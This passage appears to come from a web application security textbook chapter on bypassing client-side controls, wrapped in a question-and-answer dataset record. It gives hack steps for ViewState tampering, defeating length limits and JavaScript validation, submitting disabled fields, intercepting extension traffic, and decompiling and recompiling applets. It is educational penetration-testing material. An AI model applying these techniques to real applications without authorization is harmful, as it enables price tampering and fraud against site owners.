STEPS\n1. If you are attacking an ASP.NET application, verify whether MAC protec-\ntion is enabled for the ViewState. This is indicated by the presence of a\n20-byte hash at the end of the ViewState structure, and you can use the\nViewState parser in Burp Suite to confirm whether this is present.\n2. Even if the ViewState is protected, use Burp to decode the ViewState\non various application pages to discover whether the application is using\ntheViewState to transmit any sensitive data via the client.\n3. Try to modify the value of a specific parameter within the ViewState\nwithout interfering with its structure, and see whether an error message\nresults.\n4. If you can modify the ViewState without causing errors, you should\nreview the function of each parameter within the ViewState and\nsee whether the application uses it to store any custom data. Try to\nsubmit crafted values as each parameter to probe for common vulner-\nabilities, as you would for any other item of data being transmitted\nvia the client.\n5. Note that MAC protection may be enabled or disabled on a per-page\nbasis, so it may be necessary to test each significant page of the applica-\ntion for ViewState hacking vulnerabilities. If you are using Burp Scanner\nwith passive scanning enabled, Burp automatically reports any pages that\nuse the ViewState without MAC protection enabled.\nCapturing User Data: HTML Forms\nThe other principal way in which applications use client-side controls to restrict\ndata submitted by clients occurs with data that was not originally specifi ed by\nthe server but that was gathered on the client computer itself.\nHTML forms are the simplest and most common way to capture input from\nthe user and submit it to the server. With the most basic uses of this method,\nusers type data into named text fi elds, which are submitted to the server as\nname/value pairs. However, forms can be used in other ways; they can impose\nrestrictions or perform validation checks on the user-supplied data. When an\ncc0055..iinndddd 112277 88//1199//22001111 1122::0055::4411 PPMM\n\nStuttard c05.indd V3 - 07/22/2011 Page 128\n128 Chapter 5 n Bypassing Client-Side Controls\napplication employs these client-side controls as a security mechanism to defend\nitself against malicious input, the controls can usually be easily circumvented,\nleaving the application potentially vulnerable to attack.\nLength Limits\nConsider the following variation on the original HTML form, which imposes\na maximum length of 1 on the quantity fi eld:\n<form method=”post” action=”Shop.aspx?prod=1”>\nProduct: iPhone 5 <br/>\nPrice: 449 <br/>\nQuantity: <input type=”text” name=”quantity” maxlength=”1”> <br/>\n<input type=”hidden” name=”price” value=”449”>\n<input type=”submit” value=”Buy”>\n</form>\nHere, the browser prevents the user from entering more than one character\ninto the input fi eld, so the server-side application may assume that the quantity\nparameter it receives will be less than 10. However, this restriction can easily be\ncircumvented either by intercepting the request containing the form submission\nto enter an arbitrary value, or by intercepting the response containing the form\nto remove the maxlength attribute.",
    "question": "What are the common client-side mechanisms used in web applications to control data submission, and how can they be bypassed?",
    "summary": "This chapter discusses how web applications can be vulnerable due to reliance on client-side controls, which can be bypassed by attackers. It covers methods like hidden form fields, HTTP cookies, URL parameters, and the ASP.NET ViewState, all of which can be manipulated to alter data sent to the server. The chapter also provides steps for identifying and exploiting these vulnerabilities, emphasizing that client-side controls are not reliable and that intercepting proxies can be used to modify request data effectively."
  },
  {
    "start": 102,
    "end": 122,
    "text": "INTERCEPTING RESPONSES\nWhen you attempt to intercept and modify server responses, you may fi nd\nthat the relevant message displayed in your proxy looks like this:\nHTTP/1.1 304 Not Modified\nDate: Wed, 6 Jul 2011 22:40:20 GMT\nEtag: “6c7-5fcc0900”\nExpires: Thu, 7 Jul 2011 00:40:20 GMT\nCache-Control: max-age=7200\nThis response arises because the browser already possesses a cached copy\nof the resource it requested. When the browser requests a cached resource,\nit typically adds two headers to the request — If-Modified-Since and\nIf-None-Match:\nGET /scripts/validate.js HTTP/1.1\nHost: wahh-app.com\nIf-Modified-Since: Sat, 7 Jul 2011 19:48:20 GMT\nIf-None-Match: “6c7-5fcc0900”\nThese headers tell the server when the browser last updated its cached copy.\nThe Etag string, which the server provided with that copy of the resource,\nis a kind of serial number that the server assigns to each cacheable resource.\ncc0055..iinndddd 112288 88//1199//22001111 1122::0055::4411 PPMM\n\nStuttard c05.indd V3 - 07/22/2011 Page 129\nChapter 5 n Bypassing Client-Side Controls 129\nIt updates each time the resource is modifi ed. If the server possesses a newer\nversion of the resource than the date specifi ed in the If-Modified-Since\nheader, or if the Etag of the current version matches the one specifi ed in the\nIf-None-Match header, the server responds with the latest version of the\nresource. Otherwise, it returns a 304 response, as shown here, informing the\nbrowser that the resource has not been modifi ed and that the browser should\nuse its cached copy.\nWhen this occurs, and you need to intercept and modify the resource that\nthe browser has cached, you can intercept the relevant request and remove\nthe If-Modified-Since and If-None-Match headers. This causes the server\nto respond with the full version of the requested resource. Burp Proxy con-\ntains an option to strip these headers from every request, thereby overriding\nall cache information sent by the browser.\n\nHACK STEPS\n1. Look for form elements containing a maxlength attribute. Submit data\nthat is longer than this length but that is formatted correctly in other\nrespects (for example, it is numeric if the application expects a number).\n2. If the application accepts the overlong data, you may infer that the client-\nside validation is not replicated on the server.\n3. Depending on the subsequent processing that the application performs\non the parameter, you may be able to leverage the defects in validation to\nexploit other vulnerabilities, such as SQL injection, cross-site scripting, or\nbuffer overflows.\nScript-Based Validation\nThe input validation mechanisms built into HTML forms themselves are extremely\nsimple and are insuffi ciently fi ne-grained to perform relevant validation of\nmany kinds of input. For example, a user registration form might contain fi elds\nfor name, e-mail address, telephone number, and zip code, all of which expect\ndifferent types of input. Therefore, it is common to see customized client-side\ninput validation implemented within scripts. Consider the following variation\non the original example:\n<form method=”post” action=”Shop.aspx?prod=2” onsubmit=”return\nvalidateForm(this)”>\nProduct: Samsung Multiverse <br/>\nPrice: 399 <br/>\ncc0055..iinndddd 112299 88//1199//22001111 1122::0055::4411 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 130\n130 Chapter 5 n Bypassing Client-Side Controls\nQuantity: <input type=”text” name=”quantity”> (Maximum quantity is 50)\n<br/>\n<input type=”submit” value=”Buy”>\n</form>\n<script>function validateForm(theForm)\n{\nvar isInteger = /^\\d+$/;\nvar valid = isInteger.test(quantity) &&\nquantity > 0 && quantity <= 50;\nif (!valid)\nalert(’Please enter a valid quantity’);\nreturn valid;\n}\n</script>\nTRY IT!\nhttp://mdsec.net/shop/139/\nThe onsubmit attribute of the form tag instructs the browser to execute the\nValidateForm function when the user clicks the Submit button, and to submit\nthe form only if this function returns true. This mechanism enables the client-\nside logic to intercept an attempted form submission, perform customized\nvalidation checks on the user’s input, and decide whether to accept that input.\nIn the preceding example, the validation is simple; it checks whether the data\nentered in the amount fi eld is an integer and is between 1 and 50.\nClient-side controls of this kind are usually easy to circumvent. Usually\nit is suffi cient to disable JavaScript within the browser. If this is done, the\nonsubmit attribute is ignored, and the form is submitted without any custom\nvalidation.\nHowever, disabling JavaScript may break the application if it depends on\nclient-side scripting for its normal operation (such as constructing parts of the\nuser interface). A neater approach is to enter a benign (known good) value into\nthe input fi eld in the browser, intercept the validated submission with your\nproxy, and modify the data to your desired value. This is often the easiest and\nmost elegant way to defeat JavaScript-based validation.\nAlternatively, you can intercept the server’s response that contains the\nJavaScript validation routine and modify the script to neutralize its effect — in\nthe previous example, by changing the ValidateForm function to return true\nin every case.\ncc0055..iinndddd 113300 88//1199//22001111 1122::0055::4422 PPMM\n\nStuttard c05.indd V3 - 07/22/2011 Page 131\nChapter 5 n Bypassing Client-Side Controls 131\n\nHACK STEPS\n1. Identify any cases where client-side JavaScript is used to perform input\nvalidation prior to form submission.\n2. Submit data to the server that the validation ordinarily would have\nblocked, either by modifying the submission request to inject invalid data\nor by modifying the form validation code to neutralize it.\n3. As with length restrictions, determine whether the client-side controls are\nreplicated on the server and, if not, whether this can be exploited for any\nmalicious purpose.\n4. Note that if multiple input fields are subjected to client-side validation\nprior to form submission, you need to test each field individually with\ninvalid data while leaving valid values in all the other fields. If you submit\ninvalid data in multiple fields simultaneously, the server might stop pro-\ncessing the form when it identifies the first invalid field. Therefore, your\ntesting won’t reach all possible code paths within the application.\nNOTE Client-side JavaScript routines to validate user input are common in\nweb applications, but do not conclude that every such application is vulner-\nable. The application is exposed only if client-side validation is not replicated\non the server, and even then only if crafted input that circumvents client-side\nvalidation can be used to cause some undesirable behavior by the application.\nIn the majority of cases, client-side validation of user input has benefi cial effects\non the application’s performance and the quality of the user experience. For\nexample, when fi lling out a detailed registration form, an ordinary user might\nmake various mistakes, such as omitting required fi elds or formatting his tele-\nphone number incorrectly. In the absence of client-side validation, correcting\nthese mistakes may entail several reloads of the page and round-trip messages\nto the server. Implementing basic validation checks on the client side makes\nthe user’s experience much smoother and reduces the load on the server.\nDisabled Elements\nIf an element on an HTML form is fl agged as disabled, it appears on-screen\nbut is usually grayed out and cannot be edited or used in the way an ordinary\ncontrol can be. Also, it is not sent to the server when the form is submitted. For\nexample, consider the following form:\n<form method=”post” action=”Shop.aspx?prod=5”>\nProduct: Blackberry Rude <br/>\nPrice: <input type=”text” disabled=”true” name=”price” value=”299”>\ncc0055..iinndddd 113311 88//1199//22001111 1122::0055::4422 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 132\n132 Chapter 5 n Bypassing Client-Side Controls\n<br/>\nQuantity: <input type=”text” name=”quantity”> (Maximum quantity is 50)\n<br/>\n<input type=”submit” value=”Buy”>\n</form>\nThis includes the price of the product as a disabled text fi eld and appears\non-screen as shown in Figure 5-4.\nFigure 5-4: A form containing a disabled input field\nWhen this form is submitted, only the quantity parameter is sent to the\nserver. However, the presence of a disabled fi eld suggests that a price parameter\nmay originally have been used by the application, perhaps for testing purposes\nduring development. This parameter would have been submitted to the server\nand may have been processed by the application. In this situation, you should\ndefi nitely test whether the server-side application still processes this parameter.\nIf it does, seek to exploit this fact.\nTRY IT!\nhttp://mdsec.net/shop/104/\n\nHACK STEPS\n1. Look for disabled elements within each form of the application. Whenever\nyou find one, try submitting it to the server along with the form’s other\nparameters to determine whether it has any effect.\n2. Often, submit elements are flagged as disabled so that buttons appear\nas grayed out in contexts when the relevant action is unavailable. You\nshould always try to submit the names of these elements to determine\nwhether the application performs a server-side check before attempting\nto carry out the requested action.\ncc0055..iinndddd 113322 88//1199//22001111 1122::0055::4422 PPMM\n\nStuttard c05.indd V3 - 07/22/2011 Page 133\nChapter 5 n Bypassing Client-Side Controls 133\n3. Note that browsers do not include disabled form elements when forms\nare submitted. Therefore, you will not identify these if you simply walk\nthrough the application’s functionality, monitoring the requests issued\nby the browser. To identify disabled elements, you need to monitor the\nserver’s responses or view the page source in your browser.\n4. You can use the HTML modification feature in Burp Proxy to automatically\nre-enable any disabled fields used within the application.\nCapturing User Data: Browser Extensions\nBesides HTML forms, the other main method for capturing, validating, and\nsubmitting user data is to use a client-side component that runs in a browser\nextension, such as Java or Flash. When fi rst employed in web applications, browser\nextensions were often used to perform simple and often cosmetic tasks. Now,\ncompanies are increasingly using browser extensions to create fully functional\nclient-side components. These run within the browser, across multiple client\nplatforms, and provide feedback, fl exibility, and handling of a desktop appli-\ncation. A side effect is that processing tasks that previously would have taken\nplace on the server may be offl oaded onto the client for reasons of speed and\nuser experience. In some cases, such as online trading applications, speed is so\ncritical that much of the key application logic takes place on the client side. The\napplication design may deliberately sacrifi ce security in favor of speed, perhaps\nin the mistaken belief that traders are trusted users, or that the browser exten-\nsion includes its own defenses. Recalling the core security problem discussed\nin Chapter 2, and the earlier sections of this chapter, we know that the concept\nof a client-side component defending its business logic is impossible.\nBrowser extensions can capture data in various ways — via input forms\nand in some cases by interacting with the client operating system’s fi lesystem\nor registry. They can perform arbitrarily complex validation and manipula-\ntion of captured data before submission to the server. Furthermore, because\ntheir internal workings are less transparent than HTML forms and JavaScript,\ndevelopers are more likely to assume that the validation they perform cannot\nbe circumvented. For this reason, browser extensions are often a fruitful target\nfor discovering vulnerabilities within web applications.\nA classic example of a browser extension that applies controls on the client\nside is a casino component. Given what we have observed about the fallible\nnature of client-side controls, the idea of implementing an online gambling\napplication using a browser extension that runs locally on a potential attacker’s\ncc0055..iinndddd 113333 88//1199//22001111 1122::0055::4422 PPMM\n\nStuttard c05.indd V3 - 07/22/2011 Page 134\n134 Chapter 5 n Bypassing Client-Side Controls\nmachine is intriguing. If any aspect of the game play is controlled within the\nclient instead of by the server, an attacker could manipulate the game with\nprecision to improve the odds, change the rules, or alter the scores submitted\nto the server. Several kinds of attacks could occur in this scenario:\nn The client component could be trusted to maintain the game state. In this\ninstance, local tampering with the game state would give an attacker an\nadvantage in the game.\nn An attacker could bypass a client-side control and perform an illegal action\ndesigned to give himself an advantage within the game.\nn An attacker could fi nd a hidden function, parameter, or resource that,\nwhen invoked, allows illegitimate access to a server-side resource.\nn If the game involves any peers, or a house player, the client component\ncould be receiving and processing information about other players that,\nif known, could be used to the attacker’s advantage.\nCommon Browser Extension Technologies\nThe browser extension technologies you are most likely to encounter are Java\napplets, Flash, and Silverlight. Because these are competing to achieve similar\ngoals, they have similar properties in their architecture that are relevant to\nsecurity:\nn They are compiled to an intermediate bytecode.\nn They execute within a virtual machine that provides a sandbox environ-\nment for execution.\nn They may use remoting frameworks employing serialization to transmit\ncomplex data structures or objects over HTTP.\nJava\nJava applets run in the Java Virtual Machine (JVM) and are subject to the sand-\nboxing applied by the Java Security Policy. Because Java has existed since early\nin the web’s history, and because its core concepts have remained relatively\nunchanged, a large body of knowledge and tools are available for attacking and\ndefending Java applets, as described later in this chapter.\nFlash\nFlash objects run in the Flash virtual machine, and, like Java applets, are sand-\nboxed from the host computer. Once used largely as a method of delivering\nanimated content, Flash has moved on. With newer versions of ActionScript,\ncc0055..iinndddd 113344 88//1199//22001111 1122::0055::4422 PPMM\n\nStuttard c05.indd V3 - 07/22/2011 Page 135\nChapter 5 n Bypassing Client-Side Controls 135\nFlash is now squarely billed as capable of delivering full-blown desktop applica-\ntions. A key recent change in Flash is ActionScript 3 and its remoting capability\nwith Action Message Format (AMF) serialization.\nSilverlight\nSilverlight is Microsoft’s alternative to Flash. It is designed with the similar goal\nof enabling rich, desktop-like applications, allowing web applications to provide\na scaled-down .NET experience within the browser, in a sandboxed environment.\nTechnically, Silverlight applications can be developed in any .NET-compliant\nlanguage from C# to Python, although C# is by far the most common.\nApproaches to Browser Extensions\nYou need to employ two broad techniques when targeting applications that use\nbrowser extension components.\nFirst, you can intercept and modify the requests made by the component\nand the responses received from the server. In many cases, this is the quickest\nand easiest way to start testing the component, but you may encounter several\nlimitations. The data being transmitted may be obfuscated or encrypted, or may\nbe serialized using schemes that are specifi c to the technology being used. By\nlooking only at the traffi c generated by the component, you may overlook some\nkey functionality or business logic that can be discovered only by analyzing\nthe component itself. Furthermore, you may encounter obstacles to using your\nintercepting proxy in the normal way; however, normally these can be circum-\nvented with some careful confi guration, as described later in this chapter.\nSecond, you can target the component itself directly and attempt to decom-\npile its bytecode to view the original source, or interact dynamically with the\ncomponent using a debugger. This approach has the advantage that, if done\nthoroughly, you identify all the functionality that the component supports or\nreferences. It also allows you to modify key data submitted in requests to the\nserver, regardless of any obfuscation or encryption mechanisms used for data\nin transit. A disadvantage of this approach is that it can be time-consuming\nand may require detailed understanding of the technologies and programming\nlanguages used within the component.\nIn many cases, a combination of both these techniques is appropriate. The\nfollowing sections look at each one in more detail.\nIntercepting Traffi c from Browser Extensions\nIf your browser is already confi gured to use an intercepting proxy, and the\napplication loads a client component using a browser extension, you may see\nrequests from this component passing through your proxy. In some cases, you\ncc0055..iinndddd 113355 88//1199//22001111 1122::0055::4422 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 136\n136 Chapter 5 n Bypassing Client-Side Controls\ndon’t need to do anything more to begin testing the relevant functionality,\nbecause you can intercept and modify the component’s requests in the usual way.\nIn the context of bypassing client-side input validation that is implemented in\na browser extension, if the component submits the validated data to the server\ntransparently, this data can be modifi ed using an intercepting proxy in the same\nway as already described for HTML form data. For example, a browser exten-\nsion supporting an authentication mechanism might capture user credentials,\nperform some validation on these, and submit the values to the server as plain-\ntext parameters within the request. The validation can be circumvented easily\nwithout performing any analysis or attack on the component itself.\nIn other cases, you may encounter various obstacles that make your testing\ndiffi cult, as described in the following sections.\nHandling Serialized Data\nApplications may serialize data or objects before transmitting them within HTTP\nrequests. Although it may be possible to decipher some of the string-based data\nsimply by inspecting the raw serialized data, in general you need to unpack the\nserialized data before it can be fully understood. And if you want to modify the\ndata to interfere with the application’s processing, fi rst you need to unpack the\nserialized content, edit it as required, and reserialize it correctly. Simply edit-\ning the raw serialized data will almost certainly break the format and cause a\nparsing error when the application processes the message.\nEach browser extension technology comes with its own scheme for serializing\ndata within HTTP messages. In general, therefore, you can infer the serializa-\ntion format based on the type of client component that is being employed, but\nthe format usually is evident in any case from a close inspection of the relevant\nHTTP messages.\nJava Serialization\nThe Java language contains native support for object serialization, and Java\napplets may use this to send serialized data structures between the client and\nserver application components. Messages containing serialized Java objects\nusually can be identifi ed because they have the following Content-Type header:\nContent-Type: application/x-java-serialized-object\nHaving intercepted the raw serialized data using your proxy, you can deserialize\nit using Java itself to gain access to the primitive data items it contains.\nDSer is a handy plug-in to Burp Suite that provides a framework for viewing\nand manipulating serialized Java objects that have been intercepted within Burp.\nThis tool converts the primitive data within the intercepted object into XML\nformat for easy editing. When you have modifi ed the relevant data, DSer then\nreserializes the object and updates the HTTP request accordingly.\ncc0055..iinndddd 113366 88//1199//22001111 1122::0055::4422 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 137\nChapter 5 n Bypassing Client-Side Controls 137\nYou can download DSer, and learn more about how it works, at the follow-\ning URL:\nhttp://blog.andlabs.org/2010/09/re-visiting-java-de-serialization-it.html\nFlash Serialization\nFlash uses its own serialization format that can be used to transmit complex\ndata structures between server and client components. Action Message Format\n(AMF) normally can be identifi ed via the following Content-Type header:\nContent-Type: application/x-amf\nBurp natively supports AMF format. When it identifi es an HTTP request or\nresponse containing serialized AMF data, it unpacks the content and presents\nthis in tree form for viewing and editing, as shown in Figure 5-5. When you have\nmodifi ed the relevant primitive data items within the structure, Burp reserial-\nizes the message, and you can forward it to the server or client to be processed.\nFigure 5-5: Burp Suite supports AMF format and lets you view and edit the\ndeserialized data\ncc0055..iinndddd 113377 88//1199//22001111 1122::0055::4422 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 138\n138 Chapter 5 n Bypassing Client-Side Controls\nSilverlight Serialization\nSilverlight applications can make use of the Windows Communication Foundation\n(WCF) remoting framework that is built in to the .NET platform. Silverlight client\ncomponents using WCF typically employ Microsoft’s .NET Binary Format for\nSOAP (NBFS), which can be identifi ed via the following Content-Type header:\nContent-Type: application/soap+msbin1\nA plug-in is available for Burp Proxy that automatically deserializes NBFS-\nencoded data before it is displayed in Burp’s interception window. After you\nhave viewed or edited the decoded data, the plug-in re-encodes the data before\nit is forwarded to the server or client to be processed.\nThe WCF binary SOAP plug-in for Burp was produced by Brian Holyfi eld\nand is available to download here:\nwww.gdssecurity.com/l/b/2009/11/19/wcf-binary-soap-plug-in-for-burp/\nObstacles to Intercepting Traffi c from Browser Extensions\nIf you have set up your browser to use an intercepting proxy, you may fi nd that\nrequests made by browser extension components are not being intercepted by\nyour proxy, or are failing. This problem usually is due to issues with the com-\nponent’s handling of HTTP proxies or SSL (or both). Typically it can be handled\nvia some careful confi guration of your tools.\nThe fi rst problem is that the client component may not honor the proxy con-\nfi guration you have specifi ed in your browser or your computer’s settings. This\nis because components may issue their own HTTP requests, outside of the APIs\nprovided by the browser itself or the extension framework. If this is happen-\ning, you can still intercept the component’s requests. You need to modify your\ncomputer’s hosts fi le to achieve the interception and confi gure your proxy to\nsupport invisible proxying and automatic redirection to the correct destination\nhost. See Chapter 20 for more details on how to do this.\nThe second problem is that the client component may not accept the SSL\ncertifi cate being presented by your intercepting proxy. If your proxy is using a\ngeneric self-signed certifi cate, and you have confi gured your browser to accept it,\nthe browser extension component may reject the certifi cate nonetheless. This may\nbe because the browser extension does not pick up the browser’s confi guration\nfor temporarily trusted certifi cates, or it may be because the component itself\nprogrammatically requires that untrusted certifi cates should not be accepted.\nIn either case, you can circumvent this problem by confi guring your proxy to\nuse a master CA certifi cate, which is used to sign valid per-host certifi cates for\neach site you visit, and installing the CA certifi cate in your computer’s trusted\ncertifi cate store. See Chapter 20 for more details on how to do this.\nIn some rare cases you may fi nd that client components are communicating\nusing a protocol other than HTTP, which simply cannot be handled using an\ncc0055..iinndddd 113388 88//1199//22001111 1122::0055::4433 PPMM\n\nStuttard c05.indd V3 - 07/22/2011 Page 139\nChapter 5 n Bypassing Client-Side Controls 139\nintercepting proxy. In these situations, you still may be able to view and modify\nthe affected traffi c by using either a network sniffer or a function-hooking tool.\nOne example is Echo Mirage, which can inject into a process and intercept calls\nto socket APIs, allowing you to view and modify data before it is sent over the\nnetwork. Echo Mirage can be downloaded from the following URL:\nwww.bindshell.net/tools/echomirage\n\nHACK STEPS\n1. Ensure that your proxy is correctly intercepting all traffic from the browser\nextension. If necessary, use a sniffer to identify any traffic that is not\nbeing proxied correctly. 2. If the client component uses a standard serialization scheme, ensure that\nyou have the tools necessary to unpack and modify it. If the component\nis using a proprietary encoding or encryption mechanism, you need to\ndecompile or debug the component to fully test it. 3. Review responses from the server that trigger key client-side logic. Often,\ntimely interception and modification of a server response may allow you\nto “unlock” the client GUI, making it easy to reveal and then perform\ncomplex or multistaged privileged actions. 4. If the application performs any critical logic or events that the client com-\nponent should not be trusted to perform (such as drawing a card or rolling\ndice in a gambling application), look for any correlation between execu-\ntion of critical logic and communication with the server. If the client does\nnot communicate with the server to determine the outcome of the event,\nthe application is definitely vulnerable. Decompiling Browser Extensions\nBy far the most thorough method of attacking a browser extension component\nis to decompile the object, perform a full review of the source code, and if nec-\nessary modify the code to change the object’s behavior, and recompile it. As\nalready discussed, browser extensions are compiled into bytecode. Bytecode is a\nhigh-level platform-independent binary representation that can be executed by\nthe relevant interpreter (such as the Java Virtual Machine or Flash Player), and\neach browser extension technology uses its own bytecode format. As a result,\nthe application can run on any platform that the interpreter itself can run on. The high-level nature of bytecode representation means that it is always\ntheoretically possible to decompile the bytecode into something resembling the\noriginal source code. However, various defensive techniques can be deployed to\ncause the decompiler to fail, or to output decompiled code that is very diffi cult\nto follow and interpret. cc0055..iinndddd 113399 88//1199//22001111 1122::0055::4433 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 140\n140 Chapter 5 n Bypassing Client-Side Controls\nSubject to these obfuscation defenses, decompiling bytecode normally is the\npreferable route to understanding and attacking browser extension components. This allows you to review business logic, assess the full functionality of the\nclient-side application, and modify its behavior in targeted ways. Downloading the Bytecode\nThe fi rst step is to download the executable bytecode for you to start working\non. In general, the bytecode is loaded in a single fi le from a URL specifi ed within\nthe HTML source code for application pages that run the browser extension. Java applets generally are loaded using the <applet> tag, and other components\ngenerally are loaded using the <object> tag. For example:\n<applet code=”CheckQuantity.class” codebase=”/scripts”\nid=”CheckQuantityApplet”>\n</applet>\nIn some cases, the URL that loads the bytecode may be less immediately obvi-\nous, since the component may be loaded using various wrapper scripts provided\nby the different browser extension frameworks. Another way to identify the\nURL for the bytecode is to look in your proxy history after your browser has\nloaded the browser extension. If you take this approach, you need to be aware\nof two potential obstacles:\nn Some proxy tools apply fi lters to the proxy history to hide from view items\nsuch as images and style sheet fi les that you generally are less interested\nin. If you cannot fi nd a request for the browser extension bytecode, you\nshould modify the proxy history display fi lter so that all items are visible. n Browsers usually cache the downloaded bytecode for extension components\nmore aggressively than they do for other static resources such as images. If your browser has already loaded the bytecode for a component, even\ndoing a full refresh for a page that uses the component may not cause\nthe browser to request the component again. In this eventuality, you may\nneed to fully clear your browser’s cache, shut down every instance of the\nbrowser, and then start a fresh browser session to force your browser to\nrequest the bytecode again. When you have identifi ed the URL for the browser extension’s bytecode, usu-\nally you can just paste this URL into your browser’s address bar. Your browser\nthen prompts you to save the bytecode fi le on your local fi lesystem. TIP If you have identifi ed the request for the bytecode in your Burp Proxy\nhistory, and the server’s response contains the full bytecode (and not a ref-\nerence to an earlier cached copy), you can save the bytecode directly to fi le\ncc0055..iinndddd 114400 88//1199//22001111 1122::0055::4433 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 141\nChapter 5 n Bypassing Client-Side Controls 141\nfrom within Burp. The most reliable way to do this is to select the Headers tab\nwithin the response viewer, right-click the lower pane containing the response\nbody, and select Copy to File from the context menu. Decompiling the Bytecode\nBytecode usually is distributed in a single-fi le package, which may need to be\nunpacked to obtain the individual bytecode fi les for decompilation into source\ncode. Java applets normally are packaged as .jar (Java archive) fi les, and Silverlight\nobjects are packaged as .xap fi les. Both of these fi le types use the zip archive\nformat, so you can easily unpack them by renaming the fi les with the .zip\nextension and then using any zip reader to unpack them into the individual fi les\nthey contain. The Java bytecode is contained in .class fi les, and the Silverlight\nbytecode is contained in .dll fi les. After unpacking the relevant fi le package,\nyou need to decompile these fi les to obtain source code. Flash objects are packaged as .swf fi les and don’t require any unpacking\nbefore you use a decompiler. To perform the actual bytecode decompilation, you need to use some specifi c\ntools, depending on the type of browser extension technology that is being used,\nas described in the following sections. Java Tools\nJava bytecode can be decompiled to into Java source code using a tool called\nJad (the Java decompiler), which is available from:\nwww.varaneckas.com/jad\nFlash Tools\nFlash bytecode can be decompiled into ActionScript source code. An alternative\napproach, which is often more effective, is to disassemble the bytecode into a\nhuman-readable form, without actually fully decompiling it into source code. To decompile and disassemble Flash, you can use the following tools:\nn Flasm — www.nowrap.de/flasm\nn Flare — www.nowrap.de/flare\nn SWFScan — www.hp.com/go/swfscan (this works for Actionscript 2 and 3)\nSilverlight Tools\nSilverlight bytecode can be decompiled into source code using a tool called\n.NET Refl ector, which is available from:\nwww.red-gate.com/products/dotnet-development/reflector/\ncc0055..iinndddd 114411 88//1199//22001111 1122::0055::4433 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 142\n142 Chapter 5 n Bypassing Client-Side Controls\nWorking on the Source Code\nHaving obtained the source code for the component, or something resembling\nit, you can take various approaches to attacking it. The fi rst step generally is\nto review the source code to understand how the component works and what\nfunctionality it contains or references. Here are some items to look for:\nn Input validation or other security-relevant logic and events that occur\non the client side\nn Obfuscation or encryption routines being used to wrap user-supplied\ndata before it is sent to the server\nn “Hidden” client-side functionality that is not visible in your user interface\nbut that you might be able to unlock by modifying the component\nn References to server-side functionality that you have not previously identi-\nfi ed via your application mapping\nOften, reviewing the source code uncovers some interesting functions\nwithin the component that you want to modify or manipulate to identify\npotential security vulnerabilities. This may include removing client-side\ninput validation, submitting nonstandard data to the server, manipulating\nclient-side state or events, or directly invoking functionality that is present\nwithin the component. You can modify the component’s behavior in several ways, as described in\nthe following sections. Recompiling and Executing Within the Browser\nYou can modify the decompiled source code to change the component’s behav-\nior, recompile it to bytecode, and execute the modifi ed component within your\nbrowser. This approach is often preferred when you need to manipulate key\nclient-side events, such as the rolling of dice in a gaming application. To perform the recompilation, you need to use the developer tools that are\nrelevant to the technology you are using:\nn For Java, use the javac program in the JDK to recompile your modifi ed\nsource code. n For Flash, you can use flasm to reassemble your modifi ed bytecode or\none of the Flash development studios from Adobe to recompile modifi ed\nActionScript source code. n For Silverlight, use Visual Studio to recompile your modifi ed source code. Having recompiled your source code into one or more bytecode fi les, you\nmay need to repackage the distributable fi le if required for the technology\nbeing used. For Java and Silverlight, replace the modifi ed bytecode fi les in your\ncc0055..iinndddd 114422 88//1199//22001111 1122::0055::4433 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 143\nChapter 5 n Bypassing Client-Side Controls 143\nunpacked archive, repackage using a zip utility, and then change the extension\nback to .jar or .xap as appropriate. The fi nal step is to load your modifi ed component into your browser so that\nyour changes can take effect within the application you are testing. You can\nachieve this in various ways:\nn If you can fi nd the physical fi le within your browser’s on-disk cache that\ncontains the original executable, you can replace this with your modifi ed\nversion and restart your browser. This approach may be diffi cult if your\nbrowser does not use a different individual fi le for each cached resource\nor if caching of browser extension components is implemented only in\nmemory. n Using your intercepting proxy, you can modify the source code of the\npage that loads the component and specify a different URL, pointing to\neither the local fi lesystem or a web server that you control. This approach\nnormally is diffi cult because changing the domain from which the com-\nponent is loaded may violate the browser’s same origin policy and\nmay require reconfi guring your browser or other methods to weaken\nthis policy. n You can cause your browser to reload the component from the original\nserver (as described in the earlier section “Downloading the Bytecode”),\nuse your proxy to intercept the response containing the executable, and\nreplace the body of the message with your modifi ed version. In Burp\nProxy, you can use the Paste from File context menu option to achieve\nthis. This approach usually is the easiest and least likely to run into the\nproblems described previously. Recompiling and Executing Outside the Browser\nIn some cases, it is not necessary to modify the component’s behavior while it\nis being executed. For example, some browser extension components validate\nuser-supplied input and then obfuscate or encrypt the result before sending\nit to the server. In this situation, you may be able to modify the component to\nperform the required obfuscation or encryption on arbitrary unvalidated input\nand simply output the result locally. You can then use your proxy to intercept the\nrelevant request when the original component submits the validated input, and\nyou can replace this with the value that was output by your modifi ed component. To carry out this attack, you need to change the original executable, which is\ndesigned to run within the relevant browser extension, into a standalone pro-\ngram that can be run on the command line. The way this is done depends on\nthe programming language being used. For example, in Java you simply need\nto implement a main method. The section “Java Applets: A Worked Example”\ngives an example of how to do this. cc0055..iinndddd 114433 88//1199//22001111 1122::0055::4444 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 144\n144 Chapter 5 n Bypassing Client-Side Controls\nManipulating the Original Component Using JavaScript\nIn some cases, it is not necessary to modify the component’s bytecode. Instead,\nyou may be able to achieve your objectives by modifying the JavaScript within\nthe HTML page that interacts with the component.\n\nHaving reviewed the component’s source code, you can identify all its public\nmethods that can be invoked directly from JavaScript, and the way in which\nparameters to those methods are handled. Often, more methods are available\nthan are ever called from within application pages, and you may also discover\nmore about the purpose and handling of parameters to these methods. For example, a component may expose a method that can be invoked to enable\nor disable parts of the visible user interface. Using your intercepting proxy, you\nmay be able to edit the HTML page that loads the component and modify or\nadd some JavaScript to unlock parts of the interface that are hidden.\n\nHACK STEPS\n1. Use the techniques described to download the component’s bytecode,\nunpack it, and decompile it into source code.\n2. Review the relevant source code to understand what processing is being\nperformed.\n3. If the component contains any public methods that can be manipulated to\nachieve your objective, intercept an HTML response that interacts with the\ncomponent, and add some JavaScript to invoke the appropriate methods\nusing your input.\n4. If not, modify the component’s source code to achieve your objective, and\nthen recompile it and execute it, either in your browser or as a standalone\nprogram.\n5. If the component is being used to submit 